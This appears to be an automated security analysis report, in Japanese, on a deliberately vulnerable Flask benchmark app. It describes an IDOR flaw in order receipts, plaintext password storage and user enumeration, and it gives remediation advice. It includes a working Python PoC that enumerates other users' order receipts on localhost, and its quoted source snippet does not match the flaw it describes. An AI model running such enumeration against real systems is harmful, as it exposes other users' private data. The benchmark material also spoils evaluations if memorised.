# Security Analysis: routes.py - HTTP request handlers

## ファイル情報

- **ファイルパス**: `benchmarks/benchmarks/XBEN-001-24/app/website/app/routes.py`
- **検出パターン**: HTTP request handlers

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `IDOR`

## PAR Policy Analysis

### Principals (データ源)

- **order_id (URL path parameter)**: Untrusted
  - Context: URLパスパラメータとしてユーザーから提供される注文ID (`/order/<int:order_id>/receipt`)
  - Risk Factors: ユーザーが任意の値を指定可能, 連番による列挙攻撃が容易, 認可なしでリソースアクセスに使用される
- **session['user_id']**: SemiTrusted
  - Context: サーバーサイドセッションに保存された認証済みユーザーID
  - Risk Factors: セッション固定攻撃のリスク, リソースアクセス制御に不十分な使用
- **request.form['username']**: Untrusted
  - Context: ログインフォームからのユーザー名入力
  - Risk Factors: ユーザー列挙に使用可能, SQLインジェクション対策はORM経由で緩和されている

### Actions (セキュリティ制御)

- **session.get('user_id') 認証チェック**: Insufficient
  - Function: ユーザーがログインしているかどうかを確認
  - Weaknesses: 認証のみで認可チェックがない, リソース所有者の検証がない
  - Bypass Vectors: 有効なセッションを持つ任意のユーザーが他のリソースにアクセス可能
- **Order.query.get(order_id)**: Missing
  - Function: データベースから注文を取得
  - Weaknesses: order.user_id == session['user_id'] の検証がない, ユーザー提供のIDを直接使用
  - Bypass Vectors: order_idを変更するだけで他ユーザーのデータにアクセス

### Resources (操作対象)

- **Order (注文データ)**: High
  - Operation: データベース読み取り
  - Protection: 認証チェック（不十分）
- **User (ユーザーデータ)**: Critical
  - Operation: データベース読み取り/認証
  - Protection: セッション管理, パスワード認証（平文保存のリスク）

### Policy Violations

#### AUTHZ-001: リソースアクセス時には認可チェック（所有者検証）が必要

- **Path**: order_id (untrusted URL param) -> session.get('user_id') (認証のみ) -> Order.query.get(order_id) (認可なし)
- **Severity**: high
- **Confidence**: 0.95

#### SEC-002: パスワードはハッシュ化して保存すべき

- **Path**: request.form['password'] -> User.query.filter_by(password=password) -> db.Column(db.String(100))
- **Severity**: high
- **Confidence**: 0.85

#### ENUM-001: ユーザー列挙を防ぐために一貫したエラーメッセージを使用すべき

- **Path**: request.form['username'] -> User.query.filter_by() -> 'User not found' vs 'Incorrect password'
- **Severity**: medium
- **Confidence**: 0.90

## マッチしたソースコード

```code
def add_header(request):
    request.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    request.headers['Pragma'] = 'no-cache'
    request.headers['Expires'] = '0'
    request.headers['Cache-Control'] = 'public, max-age=0'
    return request
```

## 詳細解析

このFlask Webアプリケーションには**IDOR (Insecure Direct Object Reference) 脆弱性**が存在します。

### 脆弱性の詳細

`order_receipt` 関数（94-109行目）では、ユーザーがセッションにログインしているかどうかを確認していますが、**リクエストされた `order_id` が現在ログインしているユーザーの注文に属しているかどうかの認可チェックが欠如**しています。

具体的には:
- 104行目: `order = Order.query.get(order_id)` でURLパスから受け取った `order_id` を直接使用してデータベースから注文を取得
- 所有者の検証なし: 取得した `order.user_id` と `session['user_id']` の比較が行われていない

### 攻撃シナリオ
1. 攻撃者がアカウントを作成またはログイン
2. `/order/1/receipt`, `/order/2/receipt`, `/order/3/receipt` 等、連番でorder_idを列挙
3. 他のユーザーの注文情報（日付、銘柄、取引種別、数量、価格、レシート情報）にアクセス可能

### 追加の脆弱性
- **平文パスワード保存**: `password = db.Column(db.String(100), nullable=False)` でハッシュ化なし
- **ユーザー列挙**: ログイン時に「User not found」と「Incorrect password」で異なるエラーメッセージを返す

## PoC（概念実証コード）

```text
#!/usr/bin/env python3
"""
IDOR PoC - Trading Platform Order Receipt Access
このスクリプトは他のユーザーの注文レシートにアクセスするIDOR脆弱性を実証します。

【重要】このPoCは教育目的のみです。許可なくシステムに対して実行しないでください。
"""

import requests

# ターゲットURL（実際のテスト環境に合わせて変更）
BASE_URL = "http://localhost:5000"

def exploit_idor():
    session = requests.Session()
    
    # Step 1: ログイン（有効な認証情報が必要）
    # ベンチマークタグに "default_credentials" があるため、デフォルト認証情報が存在する可能性
    login_data = {
        "username": "testuser",
        "password": "password123"
    }
    
    # ユーザー名を送信
    session.post(f"{BASE_URL}/", data={"username": login_data["username"]})
    
    # パスワードを送信
    session.post(
        f"{BASE_URL}/password/{login_data['username']}",
        data={"password": login_data["password"]}
    )
    
    # Step 2: 他のユーザーの注文レシートを列挙
    print("[*] IDOR攻撃: 他ユーザーの注文レシートを取得中...")
    
    for order_id in range(1, 100):
        response = session.get(f"{BASE_URL}/order/{order_id}/receipt")
        
        if response.status_code == 200 and "receipt" in response.text.lower():
            print(f"[+] order_id={order_id}: レシート情報にアクセス成功")
            # レスポンスから機密情報を抽出可能
            # 例: 注文日、銘柄、取引種別、数量、価格など

if __name__ == "__main__":
    print("[!] これはIDOR脆弱性の実証コードです")
    print("[!] 許可されたテスト環境でのみ使用してください")
    # exploit_idor()  # 実行する場合はコメントを解除
```

## 修復ガイダンス

### order_receipt 関数

- **Required**: 認可チェックの追加
- **Guidance**: Order.query.get(order_id) の後に `if order.user_id != user_id: abort(403)` を追加して、リクエストしたユーザーが注文の所有者であることを確認する
- **Priority**: critical

### User モデル (パスワード保存)

- **Required**: パスワードのハッシュ化
- **Guidance**: werkzeug.security の generate_password_hash / check_password_hash を使用してパスワードをハッシュ化して保存する
- **Priority**: high

### login / password 関数

- **Required**: 一貫したエラーメッセージ
- **Guidance**: ユーザー名とパスワードのエラーで同じメッセージ（例: 'Invalid credentials'）を返す
- **Priority**: medium

## 解析ノート

コード分析を実施しました。Flask Webアプリケーションで、認証と注文管理機能を持っています。

主要な脆弱性:
1. **IDOR (Insecure Direct Object Reference)**: order_receipt関数(94-109行目)で、ユーザーがログインしているかどうかは確認していますが、リクエストされたorder_idが現在のユーザーの注文に属しているかどうかを確認していません。これにより、認証済みユーザーは他のユーザーの注文レシートにアクセスできます。

2. **パスワードの平文保存**: models.pyでパスワードがString(100)として保存されており、ハッシュ化されていない可能性が高いです。

3. **ユーザー列挙**: ログイン機能がユーザー名の存在を確認し、異なるエラーメッセージを返すため、攻撃者は有効なユーザー名を特定できます。

benchmark.jsonから、これはIDOR脆弱性を検出するためのベンチマークであることが確認できました。

